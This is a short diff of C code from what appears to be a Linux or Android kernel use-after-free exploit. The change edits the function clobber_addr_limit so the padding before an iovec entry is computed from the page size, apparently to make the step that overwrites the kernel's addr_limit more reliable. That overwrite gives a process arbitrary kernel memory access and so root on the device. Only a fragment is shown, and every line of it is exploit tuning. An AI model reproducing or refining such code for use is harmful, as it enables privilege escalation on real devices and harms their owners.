@@ -192,7 +192,9 @@ void clobber_addr_limit()
     0xfffffffffffffffe, /* value to write over addr_limit */
   };
   
-  int paddingSize = 4096*17 - UAF_SPINLOCK-sizeof(second_write_chunk);
+  int delta = (UAF_SPINLOCK+sizeof(second_write_chunk)) % PAGE;
+  int paddingSize = delta == 0 ? 0 : PAGE-delta;
+//  int paddingSize = 4096*17 - UAF_SPINLOCK-sizeof(second_write_chunk);
 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dummyBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = paddingSize; 
